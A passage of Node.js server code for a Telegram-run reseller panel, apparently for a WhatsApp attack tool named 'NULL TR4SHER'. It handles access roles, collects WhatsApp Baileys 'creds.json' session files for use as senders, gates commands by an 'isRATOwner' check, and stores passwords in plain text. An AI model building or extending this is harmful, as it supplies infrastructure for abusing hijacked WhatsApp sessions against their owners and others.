    return bot.sendMessage(chat,
      '⚠️ *GA ADA SENDER WA AKTIF!*\n\n' +
      'Ini kenapa auto-kirim ke WA gagal.\n\n' +
      '*Solusi:*\n' +
      '1. Pair WA lu dulu dari app\n' +
      '2. Atau upload `creds.json` ke folder `permenmd`\n' +
      '3. Restart server',
      { parse_mode: 'Markdown' }
    );
  }

  const list = socks.map((s, i) => `${i + 1}. \`${s}\``).join('\n');
  bot.sendMessage(chat,
    `📊 *SENDER WA AKTIF (${socks.length})*\n\n${list}`,
    { parse_mode: 'Markdown' }
  );
});

// ═══════════════════════════════════════════════════
// ✅ COMMAND: /cekuser — Cek user Telegram udah /start
// ═══════════════════════════════════════════════════
bot.onText(/^\/cekuser (.+)/i, (msg, match) => {
  const chat = msg.chat.id;
  if (!isRATOwner(msg.from.id)) return bot.sendMessage(chat, '⛔ Akses ditolak.');

  const rawUsername = match[1].trim().replace(/^@/, '').toLowerCase();

  const TG_USERS_FILE = path.join(__dirname, 'telegram_users.json');
  let tgUsers = {};
  if (fs.existsSync(TG_USERS_FILE)) {
    try { tgUsers = JSON.parse(fs.readFileSync(TG_USERS_FILE, 'utf8')); } catch {}
  }

  const total = Object.keys(tgUsers).length;
  const user = tgUsers[rawUsername];

  if (user) {
    bot.sendMessage(chat,
      `✅ *USER KEDAFTAR!*\n\n` +
      `👤 Username: @${user.username}\n` +
      `🆔 Chat ID: \`${user.chatId}\`\n` +
      `📅 Last Started: ${new Date(user.lastStarted).toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}\n\n` +
      `Total user kedaftar: *${total}*`,
      { parse_mode: 'Markdown' }
    );
  } else {
    bot.sendMessage(chat,
      `❌ *USER @${rawUsername} BELUM /start BOT!*\n\n` +
      `Minta user DM bot ini terus /start biar bisa auto-send data akun.\n\n` +
      `Total user kedaftar: *${total}*`,
      { parse_mode: 'Markdown' }
    );
  }
});

// ═══════════════════════════════════════════════════
// ✅ COMMAND: /listtg — List semua user Telegram kedaftar
// ═══════════════════════════════════════════════════
bot.onText(/^\/listtg$/i, (msg) => {
  const chat = msg.chat.id;
  if (!isRATOwner(msg.from.id)) return bot.sendMessage(chat, '⛔ Akses ditolak.');

  const TG_USERS_FILE = path.join(__dirname, 'telegram_users.json');
  let tgUsers = {};
  if (fs.existsSync(TG_USERS_FILE)) {
    try { tgUsers = JSON.parse(fs.readFileSync(TG_USERS_FILE, 'utf8')); } catch {}
  }

  const users = Object.values(tgUsers);

  if (users.length === 0) {
    return bot.sendMessage(chat, '📭 Belum ada user yang /start bot ini.');
  }

  const sorted = users.sort((a, b) =>
    new Date(b.lastStarted) - new Date(a.lastStarted)
  );

  const lines = sorted.slice(0, 20).map((u, i) =>
    `${i + 1}. @${u.username}\n   Chat ID: \`${u.chatId}\`\n   ${new Date(u.lastStarted).toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}`
  ).join('\n\n');

  bot.sendMessage(chat,
    `📊 *USER TELEGRAM KEDAFTAR (${users.length})*\n\n${lines}` +
    (users.length > 20 ? `\n\n_...dan ${users.length - 20} lainnya_` : ''),
    { parse_mode: 'Markdown' }
  );
});

// ══════════════════════════════════════════════════════════════
// ══════ FITUR /add /remove /listuser — MANAJEMEN AKSES BOT ══════
// ══════════════════════════════════════════════════════════════

// Helper: ambil userId dari berbagai format
// Bisa dari: 8656383648, @username, atau reply
async function resolveUserId(msg, arg) {
  if (!arg) {
    // Coba dari reply
    if (msg.reply_to_message) {
      return msg.reply_to_message.from.id;
    }
    return null;
  }

  // Kalau angka → langsung userId
  if (/^\d+$/.test(arg)) {
    return parseInt(arg);
  }

  // Kalau @username → cari di telegram_users.json
  if (arg.startsWith('@')) {
    const username = arg.slice(1).toLowerCase();
    const TG_USERS_FILE = path.join(__dirname, 'telegram_users.json');
    if (fs.existsSync(TG_USERS_FILE)) {
      try {
        const tgUsers = JSON.parse(fs.readFileSync(TG_USERS_FILE, 'utf8'));
        if (tgUsers[username] && tgUsers[username].chatId) {
          return tgUsers[username].chatId;
        }
      } catch (_) {}
    }
    return null;
  }

  return null;
}

// ── /add <role> <userId|@username> ──
// Contoh: /add reseller 8656383648
// Contoh: /add admin @zasa
bot.onText(/^\/add(?:@\w+)?\s+(\S+)(?:\s+(.+))?$/i, async (msg, match) => {
  const chat = msg.chat.id;
  const fromId = msg.from.id;

  if (!isRATOwner(fromId)) {
    return bot.sendMessage(chat, '⛔ Akses ditolak. Cuma owner yang bisa nambah user.');
  }

  const role = (match[1] || '').toLowerCase().trim();
  const arg  = (match[2] || '').trim();

  // Role yang valid
  const VALID_ROLES = [
    'member', 'reseller', 'vip', 'admin', 'partner',
    'moderator', 'owner', 'high owner', 'developer'
  ];

  if (!VALID_ROLES.includes(role)) {
    return bot.sendMessage(chat,
      `⚠️ *Role tidak valid!*\n\n` +
      `Role yang tersedia:\n` +
      VALID_ROLES.map(r => `• \`${r}\``).join('\n') +
      `\n\n*Contoh:*\n` +
      `\`/add reseller 8656383648\`\n` +
      `\`/add admin @zasa\``,
      { parse_mode: 'Markdown' }
    );
  }

  // Resolve userId
  const targetId = await resolveUserId(msg, arg);

  if (!targetId) {
    return bot.sendMessage(chat,
      `⚠️ *User ID ga ketemu!*\n\n` +
      `Format:\n` +
      `• \`/add ${role} 8656383648\` (userId)\n` +
      `• \`/add ${role} @username\` (harus pernah /start bot)\n` +
      `• Reply pesan user + \`/add ${role}\``,
      { parse_mode: 'Markdown' }
    );
  }

  // Load config
  const config = loadTelegramConfig();
  if (!config.userList) config.userList = [];

  // Cek udah ada belum
  if (config.userList.includes(targetId) || config.ownerList.includes(targetId)) {
    return bot.sendMessage(chat, `⚠️ User \`${targetId}\` udah punya akses.`, { parse_mode: 'Markdown' });
  }

  // Tambahin
  config.userList.push(targetId);

  // Simpan role-nya juga (buat referensi nanti)
  if (!config.roles) config.roles = {};
  config.roles[targetId] = role;

  fs.writeFileSync(telegramDataPath, JSON.stringify(config, null, 2));

  // Cari info user
  const TG_USERS_FILE = path.join(__dirname, 'telegram_users.json');
  let userInfo = '';
  if (fs.existsSync(TG_USERS_FILE)) {
    try {
      const tgUsers = JSON.parse(fs.readFileSync(TG_USERS_FILE, 'utf8'));
      const found = Object.values(tgUsers).find(u => u.chatId === targetId);
      if (found) userInfo = ` (@${found.username})`;
    } catch (_) {}
  }

  bot.sendMessage(chat,
    `✅ *Akses ditambahkan!*\n\n` +
    `🆔 User ID: \`${targetId}\`${userInfo}\n` +
    `🎯 Role: *${role.toUpperCase()}*\n\n` +
    `User ini sekarang bisa pake bot:\n` +
    `• /start\n` +
    `• Buat akun\n` +
    `• dll`,
    { parse_mode: 'Markdown' }
  );

  // Kirim notif ke user kalo dia pernah /start
  if (fs.existsSync(TG_USERS_FILE)) {
    try {
      const tgUsers = JSON.parse(fs.readFileSync(TG_USERS_FILE, 'utf8'));
      const found = Object.values(tgUsers).find(u => u.chatId === targetId);
      if (found) {
        await bot.sendMessage(targetId,
          `🎉 *Selamat!*\n\n` +
          `Kamu baru aja dapet akses bot ini dengan role *${role.toUpperCase()}*.\n\n` +
          `Ketik /start buat mulai ya!`,
          { parse_mode: 'Markdown' }
        ).catch(() => {});
      }
    } catch (_) {}
  }

  console.log(`[ADD] User ${targetId} ditambahin sebagai ${role} oleh ${fromId}`);
});

// ── /remove <userId|@username> ──
bot.onText(/^\/remove(?:@\w+)?\s+(.+)$/i, async (msg, match) => {
  const chat = msg.chat.id;
  if (!isRATOwner(msg.from.id)) return bot.sendMessage(chat, '⛔ Akses ditolak.');

  const targetId = await resolveUserId(msg, match[1].trim());
  if (!targetId) return bot.sendMessage(chat, '⚠️ User ID ga valid.');

  const config = loadTelegramConfig();
  if (!config.userList) config.userList = [];

  const idx = config.userList.indexOf(targetId);
  if (idx === -1) {
    return bot.sendMessage(chat, `⚠️ User \`${targetId}\` ga ada di list.`, { parse_mode: 'Markdown' });
  }

  config.userList.splice(idx, 1);
  if (config.roles && config.roles[targetId]) delete config.roles[targetId];
  fs.writeFileSync(telegramDataPath, JSON.stringify(config, null, 2));

  bot.sendMessage(chat, `🗑️ User \`${targetId}\` aksesnya dicabut.`, { parse_mode: 'Markdown' });
  console.log(`[REMOVE] User ${targetId} dicabut oleh ${msg.from.id}`);
});

// ── /listuser ──
bot.onText(/^\/listuser(?:@\w+)?$/i, (msg) => {
  const chat = msg.chat.id;
  if (!isRATOwner(msg.from.id)) return bot.sendMessage(chat, '⛔ Akses ditolak.');

  const config = loadTelegramConfig();
  const TG_USERS_FILE = path.join(__dirname, 'telegram_users.json');
  let tgUsers = {};
  if (fs.existsSync(TG_USERS_FILE)) {
    try { tgUsers = JSON.parse(fs.readFileSync(TG_USERS_FILE, 'utf8')); } catch (_) {}
  }

  const allIds = [...new Set([...config.ownerList, ...(config.userList || [])])];

  if (allIds.length === 0) {
    return bot.sendMessage(chat, '📭 Belum ada user yang punya akses.');
  }

  const lines = allIds.map((id, i) => {
    const isOwner = config.ownerList.includes(id);
    const role = isOwner ? '👑 OWNER' : (config.roles?.[id] || 'member').toUpperCase();
    const found = Object.values(tgUsers).find(u => u.chatId === id);
    const uname = found ? `@${found.username}` : '(belum /start)';
    return `${i + 1}. \`${id}\` — ${uname}\n   Role: *${role}*`;
  }).join('\n\n');

  bot.sendMessage(chat,
    `👥 *DAFTAR USER PUNYA AKSES (${allIds.length})*\n\n${lines}`,
    { parse_mode: 'Markdown' }
  );
});

console.log('[ACCESS] Command terpasang: /add, /remove, /listuser');

bot.on('message', async (msg) => {
  const chatId = msg.chat.id;

  if (msg.document) {
    const fileName = msg.document.file_name || '';
    if (!fileName.endsWith('.json')) {
      return;
    }

    try {
      const file = await bot.getFile(msg.document.file_id);
      const fileUrl = `https://api.telegram.org/file/bot${TOKEN}/${file.file_path}`;
      const buffer = await downloadToBuffer(fileUrl);
      const jsonData = JSON.parse(buffer.toString());

      if (!isValidBaileysCreds(jsonData)) {
        return bot.sendMessage(chatId, '❌ File tersebut bukan `creds.json` valid dari Baileys.');
      }

      // Simpan ke folder sessions/<userId>/
      const userFolder = path.join(__dirname, 'permenmd');
      if (!fs.existsSync(userFolder)) {
        fs.mkdirSync(userFolder, { recursive: true });
      }

      let finalName = fileName;
      const savePath = path.join(userFolder, finalName);

      // Jika file sudah ada, buat nama acak
      if (fs.existsSync(savePath)) {
        const randomSuffix = Date.now(); // atau bisa juga pakai: Math.random().toString(36).slice(2, 8)
        const base = path.basename(fileName, '.json');
        finalName = `${base}-${randomSuffix}.json`;
      }

      const finalSavePath = path.join(userFolder, finalName);
      fs.writeFileSync(finalSavePath, JSON.stringify(jsonData));

      bot.sendMessage(chatId, `✅ File disimpan sebagai ${finalName}.`);
    } catch (err) {
      console.error(err);
      bot.sendMessage(chatId, '⚠️ Terjadi kesalahan saat memproses file.');
    }
  }
});

// ═══════════════════════════════════════════════════════════════
// [PART 3/3] CALLBACK HANDLER — MENU UTAMA (create/list/delete)
// ═══════════════════════════════════════════════════════════════
bot.on("callback_query", async (query) => {
  const id = query.from.id;
  const data = query.data;
  const config = loadTelegramConfig();
  const isOwner = config.ownerList.includes(id);
  const isUser = config.userList.includes(id) || isOwner;

  if (!isUser) return bot.answerCallbackQuery(query.id, { text: "Tidak diizinkan." });

  // 🔥 Ambil role user (owner otomatis, selain itu ambil dari config.roles)
  const userRole = isOwner ? 'developer' : (config.roles?.[id] || 'member');

  console.log(`[CALLBACK] ${id} (role: ${userRole}) → ${data}`);

  switch (data) {
    // ═══════════════════════════════════════════════════
    // CREATE MEMBER
    // ═══════════════════════════════════════════════════
    case "create_member": {
      if (!canDo(userRole, 'create_account')) {
        return bot.answerCallbackQuery(query.id, {
          text: `⛔ Role ${userRole.toUpperCase()} ga bisa bikin akun.`,
          show_alert: true,
        });
      }

      bot.sendMessage(id,
        `Masukkan data: <code>username|password|durasi_hari</code>\n\n` +
        `Role lu: <b>${userRole.toUpperCase()}</b>\n` +
        `Contoh: <code>zasa|123|30</code>`,
        { parse_mode: "HTML" }
      );

      bot.once("message", msg => {
        // Skip kalo bukan text
        if (!msg.text || msg.text.startsWith('/')) return;

        const [username, password, day] = msg.text.split("|");
        if (!username || !password || !day)
          return bot.sendMessage(id, "❌ Format salah! Contoh: <code>zasa|123|30</code>", { parse_mode: "HTML" });
        if (password.length < 3)
          return bot.sendMessage(id, "❌ Password minimal 3 karakter!");

        // ⚠️ Reseller ga boleh > 30 hari
        if (userRole === 'reseller' && parseInt(day) > 30) {
          return bot.sendMessage(id, "❌ Reseller cuma boleh bikin akun max 30 hari.");
        }

        const db = loadDatabase();
        if (db.find(u => u.username === username))
          return bot.sendMessage(id, "❌ Username sudah ada!");

        const expired = new Date();
        expired.setDate(expired.getDate() + parseInt(day));

        db.push({
          username, password,
          role: "member",
          expiredDate: expired.toISOString().split("T")[0],
          uid: crypto.randomBytes(16).toString("hex"),
          createdBy: `telegram_${id}`,
          createdAt: new Date().toISOString(),
        });
        saveDatabase(db);

        const html = `
<h2>✅ Akun Member Dibuat!</h2>
<table bordered striped>
  <tr><th>Field</th><th>Value</th></tr>
  <tr><td>Username</td><td><code>${username}</code></td></tr>
  <tr><td>Password</td><td><code>${password}</code></td></tr>
  <tr><td>Expired</td><td><code>${expired.toISOString().split("T")[0]}</code></td></tr>
  <tr><td>Dibuat oleh</td><td>${userRole.toUpperCase()}</td></tr>
</table>
<p><i>Simpan data ini baik-baik ya.</i></p>`.trim();

        sendRichMessage(id, html).catch(() =>
          bot.sendMessage(id, `✅ Akun <b>${username}</b> dibuat!\nPassword: <code>${password}</code>`, { parse_mode: "HTML" })
        );
      });
      break;
    }

    // ═══════════════════════════════════════════════════
    // LIST USER
    // ═══════════════════════════════════════════════════
    case "list_user": {
      if (!canDo(userRole, 'list_user')) {
        return bot.answerCallbackQuery(query.id, {
          text: `⛔ Role ${userRole.toUpperCase()} ga bisa liat list.`,
          show_alert: true,
        });
      }
      const users = getFormattedUsers();
      bot.sendMessage(id, `📋 <b>Daftar Pengguna:</b>\n${users}`, { parse_mode: "HTML" });
      break;
    }

    // ═══════════════════════════════════════════════════
    // CREATE CUSTOM USER
    // ═══════════════════════════════════════════════════
    case "create_custom": {
      if (!canDo(userRole, 'create_account')) {
        return bot.answerCallbackQuery(query.id, {
          text: `⛔ Role ${userRole.toUpperCase()} ga bisa bikin akun.`,
          show_alert: true,
        });
      }

      const allowedRoles = getAllowedRolesToCreate(userRole);
      if (allowedRoles.length === 0) {
        return bot.sendMessage(id, `❌ Role ${userRole.toUpperCase()} ga bisa bikin akun custom.`);
      }

      bot.sendMessage(id,
        `Masukkan: <code>username|password|role|durasi_hari</code>\n\n` +
        `Role lu: <b>${userRole.toUpperCase()}</b>\n` +
        `Role yang boleh lu bikin: <b>${allowedRoles.join(', ')}</b>\n` +
        `Contoh: <code>zasa|123|vip|30</code>`,
        { parse_mode: "HTML" }
      );

      bot.once("message", msg => {
        if (!msg.text || msg.text.startsWith('/')) return;

        const [username, password, role, day] = msg.text.split("|");
        if (!username || !password || !role || !day)
          return bot.sendMessage(id, "❌ Format salah! Contoh: <code>zasa|123|vip|30</code>", { parse_mode: "HTML" });
        if (password.length < 3)
          return bot.sendMessage(id, "❌ Password minimal 3 karakter!");

        // ✅ VALIDASI ROLE TARGET SESUAI HIERARKI
        if (!allowedRoles.includes(role.toLowerCase())) {
          return bot.sendMessage(id,
            `❌ Role ${userRole.toUpperCase()} ga bisa bikin akun ${role.toUpperCase()}.\n` +
            `Yang boleh: ${allowedRoles.join(', ')}`
          );
        }

        // ⚠️ Reseller ga boleh > 30 hari
        if (userRole === 'reseller' && parseInt(day) > 30) {
          return bot.sendMessage(id, "❌ Reseller cuma boleh bikin akun max 30 hari.");
        }

        const db = loadDatabase();
        if (db.find(u => u.username === username))
          return bot.sendMessage(id, "❌ Username sudah ada!");

        const expired = new Date();
        expired.setDate(expired.getDate() + parseInt(day));

        db.push({
          username, password, role: role.toLowerCase(),
          expiredDate: expired.toISOString().split("T")[0],
          uid: crypto.randomBytes(16).toString("hex"),
          createdBy: `telegram_${id}`,
          createdAt: new Date().toISOString(),
        });
        saveDatabase(db);

        const html = `
<h2>✅ Akun ${role.toUpperCase()} Dibuat!</h2>
<table bordered striped>
  <tr><th>Field</th><th>Value</th></tr>
  <tr><td>Username</td><td><code>${username}</code></td></tr>
  <tr><td>Password</td><td><code>${password}</code></td></tr>
  <tr><td>Role</td><td><b>${role.toUpperCase()}</b></td></tr>
  <tr><td>Expired</td><td><code>${expired.toISOString().split("T")[0]}</code></td></tr>
  <tr><td>Dibuat oleh</td><td>${userRole.toUpperCase()}</td></tr>
</table>`.trim();

        sendRichMessage(id, html).catch(() =>
          bot.sendMessage(id, `✅ Akun <b>${role}</b> dibuat!\nUsername: <code>${username}</code>`, { parse_mode: "HTML" })
        );
      });
      break;
    }

    // ═══════════════════════════════════════════════════
    // DELETE USER
    // ═══════════════════════════════════════════════════
    case "delete_user": {
      if (!canDo(userRole, 'delete_user')) {
        return bot.answerCallbackQuery(query.id, {
          text: `⛔ Role ${userRole.toUpperCase()} ga bisa hapus user.`,
          show_alert: true,
        });
      }

      bot.sendMessage(id, "Masukkan username yang akan dihapus:");
      bot.once("message", msg => {
        if (!msg.text || msg.text.startsWith('/')) return;

        const db = loadDatabase();
        const targetUser = db.find(u => u.username === msg.text);
        if (!targetUser) return bot.sendMessage(id, "❌ User tidak ditemukan.");

        // ⚠️ Cek hierarki — ga boleh hapus role lebih tinggi/equal
        const targetLevel = ['developer', 'high owner', 'owner', 'moderator', 'partner', 'admin', 'vip', 'reseller', 'member'].indexOf(targetUser.role || 'member');
        const myLevel = ['developer', 'high owner', 'owner', 'moderator', 'partner', 'admin', 'vip', 'reseller', 'member'].indexOf(userRole);

        if (myLevel <= targetLevel) {
          return bot.sendMessage(id, `❌ Ga bisa hapus user dengan role ${targetUser.role.toUpperCase()} (level sama/lebih tinggi).`);
        }

        const index = db.findIndex(u => u.username === msg.text);
        const deleted = db.splice(index, 1)[0];
        saveDatabase(db);
        bot.sendMessage(id, `🗑️ User <b>${deleted.username}</b> berhasil dihapus.`, { parse_mode: "HTML" });
      });
      break;
    }

    // ═══════════════════════════════════════════════════
    // SET EXPIRE
    // ═══════════════════════════════════════════════════
    case "set_expire": {
      if (!canDo(userRole, 'set_expire')) {
        return bot.answerCallbackQuery(query.id, {
          text: `⛔ Role ${userRole.toUpperCase()} ga bisa set expired.`,
          show_alert: true,
        });
      }

      bot.sendMessage(id, "Masukkan: <code>username|jumlah_hari</code> (contoh: <code>zasa|30</code>)", { parse_mode: "HTML" });
      bot.once("message", msg => {
        if (!msg.text || msg.text.startsWith('/')) return;

        const [username, days] = msg.text.split("|");
        if (!username || !days) return bot.sendMessage(id, "❌ Format salah!");

        const db = loadDatabase();
        const user = db.find(u => u.username === username);
        if (!user) return bot.sendMessage(id, "❌ User tidak ditemukan.");

        // ⚠️ Cek hierarki
        const targetLevel = ['developer', 'high owner', 'owner', 'moderator', 'partner', 'admin', 'vip', 'reseller', 'member'].indexOf(user.role || 'member');
        const myLevel = ['developer', 'high owner', 'owner', 'moderator', 'partner', 'admin', 'vip', 'reseller', 'member'].indexOf(userRole);

        if (myLevel <= targetLevel) {
          return bot.sendMessage(id, `❌ Ga bisa edit user dengan role ${user.role.toUpperCase()} (level sama/lebih tinggi).`);
        }

        const current = new Date(user.expiredDate);
        current.setDate(current.getDate() + parseInt(days));
        user.expiredDate = current.toISOString().split("T")[0];
        saveDatabase(db);

        bot.sendMessage(id, `✅ Expired <b>${username}</b> ditambah ${days} hari.\nSekarang: <code>${user.expiredDate}</code>`, { parse_mode: "HTML" });
      });
      break;
    }
  }
});
// ═══════════════════════════════════════════════════════════════
// END PART 3/3
// ═══════════════════════════════════════════════════════════════

bot.onText(/^\/?clear/, async (msg) => {
  const chatId = msg.chat.id;
  const id = msg.from.id;
  const config = loadTelegramConfig();
  const isOwner = config.ownerList.includes(id);

  if (!isOwner) {
    return bot.sendMessage(chatId, "❌ [ACCESS] *PERMISSION DENIED*\n\n⚠️ You are not authorized to execute this command.", { parse_mode: "Markdown" });
  }

  try {
    if (!fs.existsSync(SESSION_PATH)) {
      return bot.sendMessage(chatId, "⚠️ [SYSTEM] *ERROR: DIRECTORY NOT FOUND*\n\nTarget folder 'permenmd' does not exist.", { parse_mode: "Markdown" });
    }

    let deletedCount = 0;
    const userFolders = fs.readdirSync(SESSION_PATH);

    for (const userFolder of userFolders) {
      const userPath = path.join(SESSION_PATH, userFolder);

      if (!fs.lstatSync(userPath).isDirectory()) continue;

      const hasJson = fs.readdirSync(userPath).some(f => f.endsWith(".json"));
      if (!hasJson) {
        fs.rmSync(userPath, { recursive: true, force: true });
        deletedCount++;
      }
    }

    const responseMsg = deletedCount > 0 
      ? `🗑️ [SYSTEM] *GARBAGE COLLECTOR*\n\n✅ Purged ${deletedCount} corrupted/empty session folders.`
      : `✨ [SYSTEM] *NO JUNK FOUND*\n\nServer storage is clean.`;

    bot.sendMessage(chatId, responseMsg, { parse_mode: "Markdown" });
    console.log(`[LOG] Purged ${deletedCount} junk folders.`);
    
  } catch (err) {
    console.error("[ERROR] Cleanup failed:", err);
    bot.sendMessage(chatId, "⚠️ [SYSTEM] *CRITICAL ERROR*\n\nFailed to execute cleanup script.", { parse_mode: "Markdown" });
  }
});

bot.onText(/^\/?restart/, async (msg) => {
  const chatId = msg.chat.id;
  const id = msg.from.id;
  const config = loadTelegramConfig();
  const isOwner = config.ownerList.includes(id);

  if (!isOwner) {
    return bot.sendMessage(chatId, "❌ [ACCESS] *PERMISSION DENIED*\n\n⚠️ Root access required for this action.", { parse_mode: "Markdown" });
  }

  bot.sendMessage(chatId, "⚙️ [SERVER] *SYSTEM REBOOT*\n\nSending SIGTERM...\nReason: Manual Request\nStatus: *RESTARTING*...", { parse_mode: "Markdown" });
  await unfollowAllChannel();
  console.log("[SERVER] Manual restart triggered by Owner.");

  setTimeout(() => {
    process.exit(0);
  }, 2000);
});

setTimeout(() => {
    const targetChatId = "-1003838770038"; 
    bot.sendMessage(
      targetChatId, 
      "✅ [SERVER] *SERVICES ONLINE*\n\n" +
      "System Status: *RUNNING*\n" +
      "Uptime: Just started\n\n" +
      "🛒 *BUY ACCESS System:*\n" +
      "• /pendingbuy — List request pending\n" +
      "• /listbuy — List 10 request terbaru\n\n" +
      "✅ All systems operational.", 
      { parse_mode: "Markdown" }
    ).catch(() => {});
  }, 3000);

function scheduleAutoClean() {
  const now = new Date();

  // 00:00 WIB = 17:00 UTC
  const nextMidnight = new Date();
  nextMidnight.setUTCHours(17, 0, 0, 0);

  // kalau sudah lewat, jadwalkan besok
  if (now >= nextMidnight) {
    nextMidnight.setUTCDate(nextMidnight.getUTCDate() + 1);
  }

  const delay = nextMidnight - now;

  setTimeout(() => {
    hapusIsiUserLogs();

    // ulangi setiap hari tepat jam yang sama
    setInterval(hapusIsiUserLogs, 24 * 60 * 60 * 1000);
  }, delay);
}

// ══════════════════════════════════════════════════════════════
// ══════ CHAT REST API (BUAT chat.dart) ══════
// ══════════════════════════════════════════════════════════════

const GLOBAL_CHAT_FILE = path.join(__dirname, 'global_chat.json');
const PRIVATE_CHAT_FILE = path.join(__dirname, 'private_chat.json');
const PROFILE_FILE = path.join(__dirname, 'profiles.json');

function loadJSON(file, def = []) {
  try { if (!fs.existsSync(file)) return def; return JSON.parse(fs.readFileSync(file, 'utf8')); }
  catch { return def; }
}
function saveJSON(file, data) { fs.writeFileSync(file, JSON.stringify(data, null, 2)); }

// ── GET /chat/profile ──
app.get('/chat/profile', (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });

  const profiles = loadJSON(PROFILE_FILE, {});
  const prof = profiles[keyInfo.username] || {
    name: keyInfo.username,
    bio: 'Hai! Gue pake NULL TR4SHER',
  };
  res.json({ valid: true, profile: prof });
});

// ── GET /chat/global/messages ──
app.get('/chat/global/messages', (req, res) => {
  const { key, limit } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });

  let msgs = loadJSON(GLOBAL_CHAT_FILE, []);
  if (limit) msgs = msgs.slice(-parseInt(limit));

  // Attach profile info
  const profiles = loadJSON(PROFILE_FILE, {});
  const enriched = msgs.map(m => ({
    ...m,
    senderProfile: profiles[m.sender] || { name: m.sender, bio: '' },
  }));

  res.json({ valid: true, messages: enriched });
});

// ── POST /chat/global/send ──
app.post('/chat/global/send', (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });

  const { message, type, replyTo } = req.body;
  if (!message || message.length > 500) {
    return res.status(400).json({ valid: false, error: 'Pesan kosong / kepanjangan' });
  }

  const msgs = loadJSON(GLOBAL_CHAT_FILE, []);
  const newMsg = {
    id: 'G-' + Date.now().toString(36) + Math.random().toString(36).slice(2, 6),
    sender: keyInfo.username,
    message: sanitize(message),
    type: type || 'text',
    replyTo: replyTo || null,
    timestamp: new Date().toISOString(),
  };
  msgs.push(newMsg);
  if (msgs.length > 500) msgs = msgs.slice(-500); // batasi 500
  saveJSON(GLOBAL_CHAT_FILE, msgs);

  // Broadcast ke WebSocket klien
  Object.values(wsClients).forEach(ws => {
    try { ws.send(JSON.stringify({ type: 'global_message', message: newMsg })); } catch (_) {}
  });

  res.json({ valid: true, message: newMsg });
});

// ── GET /chat/private/users ──
app.get('/chat/private/users', (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });

  const all = loadJSON(PRIVATE_CHAT_FILE, []);
  const myChats = {}; // { username: lastMsg }

  all.forEach(m => {
    if (m.sender === keyInfo.username || m.receiver === keyInfo.username) {
      const other = m.sender === keyInfo.username ? m.receiver : m.sender;
      if (!myChats[other] || new Date(m.timestamp) > new Date(myChats[other].timestamp)) {
        myChats[other] = m;
      }
    }
  });

  const profiles = loadJSON(PROFILE_FILE, {});
  const users = Object.entries(myChats).map(([username, lastMsg]) => ({
    username,
    profile: profiles[username] || { name: username, bio: '' },
    lastMessage: lastMsg,
  }));

  res.json({ valid: true, users });
});

// ── GET /chat/private/messages/:user ──
app.get('/chat/private/messages/:user', (req, res) => {
  const { key, limit } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });

  const withUser = req.params.user;
  let msgs = loadJSON(PRIVATE_CHAT_FILE, []).filter(m =>
    (m.sender === keyInfo.username && m.receiver === withUser) ||
    (m.sender === withUser && m.receiver === keyInfo.username)
  );
  if (limit) msgs = msgs.slice(-parseInt(limit));

  const formatted = msgs.map(m => ({
    ...m,
    fromMe: m.sender === keyInfo.username,
  }));

  res.json({ valid: true, messages: formatted });
});

// ── POST /chat/private/send/:user ──
app.post('/chat/private/send/:user', (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });

  const receiver = req.params.user;
  const { message, type, replyTo } = req.body;
  if (!message || message.length > 500) {
    return res.status(400).json({ valid: false, error: 'Pesan kosong / kepanjangan' });
  }

  // Cek user ada ga
  const db = loadDatabase();
  if (!db.find(u => u.username === receiver)) {
    return res.status(404).json({ valid: false, error: 'User ga ketemu' });
  }

  const all = loadJSON(PRIVATE_CHAT_FILE, []);
  const newMsg = {
    id: 'P-' + Date.now().toString(36) + Math.random().toString(36).slice(2, 6),
    sender: keyInfo.username,
    receiver,
    message: sanitize(message),
    type: type || 'text',
    replyTo: replyTo || null,
    read: false,
    timestamp: new Date().toISOString(),
  };
  all.push(newMsg);
  if (all.length > 1000) all.splice(0, all.length - 1000);
  saveJSON(PRIVATE_CHAT_FILE, all);

  // Kirim ke WebSocket penerima
  if (wsClients[receiver]) {
    try {
      wsClients[receiver].send(JSON.stringify({ type: 'private_message', message: newMsg }));
    } catch (_) {}
  }

  res.json({ valid: true, message: newMsg });
});

// ── POST /chat/private/mark-read/:user ──
app.post('/chat/private/mark-read/:user', (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });

  const all = loadJSON(PRIVATE_CHAT_FILE, []);
  all.forEach(m => {
    if (m.sender === req.params.user && m.receiver === keyInfo.username) m.read = true;
  });
  saveJSON(PRIVATE_CHAT_FILE, all);
  res.json({ valid: true });
});

// ── GET /chat/search-users ──
app.get('/chat/search-users', (req, res) => {
  const { key, q } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });
  if (!q || q.length < 2) return res.json({ valid: true, users: [] });

  const db = loadDatabase();
  const profiles = loadJSON(PROFILE_FILE, {});
  const query = q.toLowerCase();

  const users = db
    .filter(u => u.username.toLowerCase().includes(query) && u.username !== keyInfo.username)
    .slice(0, 20)
    .map(u => ({
      username: u.username,
      role: u.role || 'member',
      profile: profiles[u.username] || { name: u.username, bio: '' },
    }));

  res.json({ valid: true, users });
});

console.log('[CHAT] REST API terpasang: /chat/profile, /chat/global/*, /chat/private/*, /chat/search-users');

// ══════ CHAT SERVER ══════
global.activeKeys = activeKeys; // Share ke chat_server
require('./chat_server')(app);

// ══════ CALL CRYLIX API ══════
const mountCallCrylix = require('./call_crylix_api');
mountCallCrylix({
  app,
  wss,
  wsClients,
  activeKeys,
  loadDatabase,
  saveDatabase,
  sanitize,
  saveChat,
  chatList,
});
// ===== Start Express Server (listen sudah di atas, satu port PORT) =====
const appServer = server;
// ═══════════════════════════════════════════════════════════════
// SOCKET.IO SETUP (WAJIB DI ATAS SEBELUM DIPAKE)
// ═══════════════════════════════════════════════════════════════
const io = new Server(appServer, {
  allowEIO3: true,
  cors: { origin: '*' },
  maxHttpBufferSize: 10e6
});

